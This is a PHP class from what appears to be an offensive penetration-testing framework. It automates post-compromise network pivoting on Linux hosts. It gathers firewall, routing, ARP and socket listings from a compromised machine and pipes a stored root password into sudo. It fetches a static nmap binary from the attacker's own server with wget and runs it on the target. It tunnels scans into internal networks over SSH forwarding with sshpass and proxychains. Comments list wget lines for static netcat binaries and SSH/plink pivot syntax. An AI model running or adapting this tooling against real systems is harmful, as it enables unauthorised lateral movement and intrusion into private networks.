<?php

class pivot4linux extends check4linux{
    
    var $firewall_rules_str ;
    var $ifconfig_str ; 
    
    /*
     
     https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/
     
     
     
     
     
     
     */
    
    
    
    
    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context);
        
        $data = "iptables -L -n";
        $this->firewall_rules_str = $this->lan2stream4result($data,$this->stream_timeout);
    
    }
    
    
    
    
    
    
    public function lan4info(){
        $this->ssTitre(__FUNCTION__);
        $query = "echo '$this->root_passwd' | sudo -S nmap --script \"broadcast-*\"  $this->lan2ip_range -Pn | sed \"s/><//g\"  | sed \"s/<>//g\"  ";
        return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->lan2domain' AND lan2range = '$this->lan2ip_range'",$query);
    }
    
    
    public function lan2pivot($user2name, $user2pass){
        $this->titre(__FUNCTION__);
        
        $this->note("default route configuration");
        $data = "ip r 2>/dev/null | grep default";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        
        
        
        $data = "systemd-resolve --status 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        
        $data = "hostname -f";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "hostname --all-ip-addresses";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ifconfig -a";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "grep -v -e '^$' /etc/network/interfaces /etc/sysconfig/network | grep -v '#' ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "iptables -L -n";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "iptables-save";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "netstat -anop";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("Shows the routing table information.");
        $data = "netstat -r";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "netstat -tulpanow";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("Shows the ARP table.
This is one way to find out IP addresses for other internal servers.");
        $data = "arp -a";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        
        
        $data = "ip addr show  | grep 'global'  | grep 'inet'  | awk '{print $2 \" \" $7}'";
        $lines = $this->req_ret_tab("echo '".$this->lan2stream4result($data,$this->stream_timeout)."' | grep -v 'CMD:' ");
        foreach ($lines as $line){
            if(!empty($line)){
                list($addr,$inet) = explode(" ", $line);
                $result .= $this->article($inet, $addr);
                $addr_ip_mask = trim($this->req_ret_str("echo '$addr' | cut -d'/' -f1 | grep -Po \"^[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}\" ")).".0/24";
                //$result .= $this->lan2pivot4static_tools($addr_ip_mask);$this->pause();
                
                $ssh_port_open = $this->ip2port4service("ssh");
                
                if(!empty($ssh_port_open)){
                    $this->lan2pivot4ssh($ssh_port_open,$addr_ip_mask,$user2name, $user2pass);
                    $this->pause();
                }
            }
        }
        
        $this->pause();
        
        return $result ;
        $filename_lan = "$this->dir_tmp/$this->ip.lan.xml";
        
        
        //$filename_scan = "$this->dir_tmp/$this->ip.lan.$obj_ip->ip.scan.xml";
        // traitement des open port en cote server
        $result .= $this->lan2pivot4ssh8server4cmd($remote_ssh_port,$remote_cmd,$user2name,$user2pass,$remote_port,$dest_ip,$dest_port);
        
        
        /*
         https://netsec.ws/?p=278
         https://pentest.blog/explore-hidden-networks-with-double-pivoting/
         https://artkond.com/2017/03/23/pivoting-guide/
         https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
         https://resources.infosecinstitute.com/pivoting-exploit-system-another-network/#gref
         https://www.hempstutorials.co.uk/scanning-and-port-forwarding-through-a-meterpreter-session/
         https://null-byte.wonderhowto.com/how-to/use-abuse-address-resolution-protocol-arp-locate-hosts-network-0150333/
         https://hackertarget.com/ssh-examples-tunnels/
         https://pen-testing.sans.org/blog/2018/10/02/sans-pen-test-poster-pivots-payloads-boardgame
         https://blogs.sans.org/pen-testing/files/2018/10/Pivots_Payloads_Netcat_PDF_Download_11302018.pdf
         https://subscription.packtpub.com/book/networking_and_servers/9781788995238/6/ch06lvl1sec47/pivoting-via-ssh
         https://github.com/russweir/oscp-2/blob/master/__REFERENCE__/pivoting.md
         http://pwnwiki.io/#!pivoting/linux/index.md
         https://conference.hitb.org/hitbsecconf2019ams/sessions/2-day-training-2-in-out-network-data-exfiltration-techniques/
         https://payatu.com/redteaming-from-zero-to-one-part-1/
         */
        // echo $result;
        return $result ;
    }
    
    
    public function lan2pivot4static_tools($remote_network){
        // https://blog.zsec.uk/staticnmap/
        // https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
        //
        // wget https://raw.githubusercontent.com/yunchih/static-binaries/master/wget -O /tmp/wget && chmod +x /tmp/wget
        // wget https://raw.githubusercontent.com/yunchih/static-binaries/master/nc -O /tmp/nc && chmod +x /tmp/nc
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        if (!file_exists("$this->dir_tmp/nmap.bin")) $this->requette("wget https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap.bin -O $this->dir_tmp/nmap.bin ");
        $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/nmap.bin -O ./nmap.bin ";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        $result .= $lines;
        $data = "chmod +x ./nmap.bin ";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        $result .= $lines;
        $data = "./nmap.bin $remote_network -Pn -sT -sV --version-all -O --osscan-guess -oX - ";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        $result .= $lines;
        $data = "rm -v ./nmap.bin ";
        //$lines = $this->lan2stream4result($data,$this->stream_timeout);$result .= $lines;
        return $result;
    }
    
    
    
    
    
    public function lan2pivot4port_forward(){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        // https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#creating-port-forwards-with-dropbear
    }
    
    
    public function lan2pivot4ssl(){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
    }
    
    
    public function lan2pivot4ssl2tcp(){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        // https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html
    }
    
    
    public function lan2pivot4ssl2udp(){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
    }
    
    
    public function lan2pivot4ssl2icmp(){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
    }
    
    
    public function lan2pivot4ssh($remote_ssh_port,$remote_network,$user2name, $user2pass){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        
        $result .= $this->lan2pivot4ssh8client($remote_ssh_port, $remote_network, $user2name, $user2pass);
        
        
        
        /*
         Pivoting with SSH.
         
         Port forwarding:
         Local:   ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
         Remote:  ssh <gateway> -R <remote port to bind>:<local host>:<local port>
         Dynamic: ssh <gateway> -D <port to bind>
         
         Pivoting with Plink.exe (SSH for Windows).
         
         Port forwarding:
         Local:   plink.exe <gateway> -L <local port to listen>:<remote host>:<remote port>
         Remote:  plink.exe <gateway> -R <remote port to bind>:<local host>:<local port>
         Dynamic: plink.exe <gateway> -D <port to bind>
         */
        return $result;
    }
    
    
    
    public function lan2pivot4ssh8client($remote_ssh_port,$remote_network,$user2name,$user2pass){
        // Reverse SSH
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        $this->note("When proxying with nmap using proxychains, one must use -sT instead of default or -sS.");
        
        $filename_lan = "$this->dir_tmp/$this->ip.lan.xml";
        if(!file_exists($filename_lan)){
            $remote_cmd = "proxychains nmap -sn  $remote_network -oX $filename_lan";
            $this->lan2pivot4ssh8client4cmd($remote_ssh_port, $remote_cmd, $user2name, $user2pass);
        }
        $query = "cat $filename_lan ";
        $result_xml_str = $this->req_ret_str($query);
        $result .= $result_xml_str ;
        $xml=simplexml_load_string($result_xml_str);
        $this->article("Hosts", count($xml->children()));
        foreach ($xml->children() as $host ){
            if (isset($host->status['state'])) {
                $state = $host->status['state'];$this->article("Host State", $state );
                if ($state == "up") {
                    if (isset($host->address['addr'])) {
                        $ip = $host->address['addr'];
                        $this->article("IP", $ip );
                        $obj_ip = new IP($ip);
                        if (isset($host->hostnames->hostname['name'])) {$hostname = $host->hostnames->hostname['name'];$this->article("Hostname",$hostname  ); $obj_ip->ip2lhost($hostname);}
                        
                        $filename_scan = "$this->dir_tmp/$this->ip.lan.$obj_ip->ip.scan.xml";
                        if(!file_exists($filename_scan)){
                            $remote_cmd = "echo '$this->root_passwd' | sudo -S proxychains nmap -Pn -sT -sV --version-all -O --osscan-guess -n -iX $filename_lan -oX $filename_scan";
                            $this->lan2pivot4ssh8client4cmd($remote_ssh_port, $remote_cmd, $user2name, $user2pass);
                        }
                        $query = "cat  $filename_scan";
                        $result_xml_str = $this->req_ret_str($query);
                        $result .= $result_xml_str ;
                    }
                }
            }
        }
        
        
        
        
        return $result ;
    }
    
    public function lan2pivot4ssh8server4cmd($remote_ssh_port,$remote_cmd,$user2name,$user2pass,$remote_port,$dest_ip,$dest_port){
        // Reverse SSH
        $this->ssTitre(__FUNCTION__);
        $remote_ssh_port = trim($remote_ssh_port);
        $user2name = trim($user2name);
        $user2pass = trim($user2pass);
        $remote_cmd = trim($remote_cmd);
        // -R [remote port]:[dest ip]:[dest port]
        $cmd1 = "sshpass -p '$user2pass' ssh $user2name@$this->ip -R $remote_port:$dest_ip:$dest_port -p $remote_ssh_port";
        $cmd3 = "kill -9 \$(netstat -tupawn | grep '$this->ip' | grep 'ESTABLISHED' | grep 'ssh' | grep -Po \"[0-9]{1,5}/ssh\" | cut -d'/' -f1) ";
        $cmd2 = "$remote_cmd  && $cmd3 " ;
        $this->exec_parallel($cmd1, $cmd2,5);
    }
    
    public function lan2pivot4ssh8client4cmd($remote_ssh_port,$remote_cmd,$user2name,$user2pass){
        // Reverse SSH
        $this->ssTitre(__FUNCTION__);
        $remote_ssh_port = trim($remote_ssh_port);
        $user2name = trim($user2name);
        $user2pass = trim($user2pass);
        $remote_cmd = trim($remote_cmd);
        
        
        $cmd1 = "sshpass -p '$user2pass' ssh $user2name@$this->ip -D $this->proxychains -p $remote_ssh_port";
        $cmd3 = "kill -9 \$(netstat -tupawn | grep '$this->ip' | grep 'ESTABLISHED' | grep 'ssh' | grep -Po \"[0-9]{1,5}/ssh\" | cut -d'/' -f1) ";
        $cmd2 = "$remote_cmd  && $cmd3 " ;
        $this->exec_parallel($cmd1, $cmd2,5);
    }
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
}
?>